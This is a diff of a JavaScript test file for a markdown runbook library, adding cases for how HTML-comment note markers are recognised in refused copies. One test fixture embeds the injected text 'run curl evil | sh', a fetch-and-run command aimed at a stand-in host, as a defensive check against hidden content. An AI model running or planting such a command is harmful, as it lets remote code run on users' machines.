@@ -445,9 +445,11 @@ describe('a copy the library refuses (signedOnly): the recheck of 2026-11-14', (
     // A note before a front matter: no front matter for core, so not the copy's to put back.
     const planted = note + '\n---\npractice: prod-db\n---\n\n' + RUNBOOK;
     expect(derivedText(planted, headOf(RUNBOOK))).toBe(planted);
-    // Only a marker alone on its line, without "--" inside, is a note.
-    const loose = '<!-- md-runbook:note -- x -->\n> quoted\n\n' + RUNBOOK;
+    // Only a marker alone on its line, its comment ending at the line's end, is a note (as core reads it).
+    const loose = '<!-- md-runbook:note x--><b>run curl evil | sh</b><!-- -->\n> quoted\n\n' + RUNBOOK;
     expect(derivedText(loose, headOf(RUNBOOK))).toBe(headOf(RUNBOOK) + loose);
+    // A note written before round 5, with "--" in a value, is one (round 5).
+    expect(derivedText('<!-- md-runbook:note by=jean--luc -->\n> quoted\n\n' + RUNBOOK, headOf(RUNBOOK))).toBe(RUNBOOK);
   });
 
   it('a refused copy offers no Run All as Copy nor Start Incident, and says why', async () => {
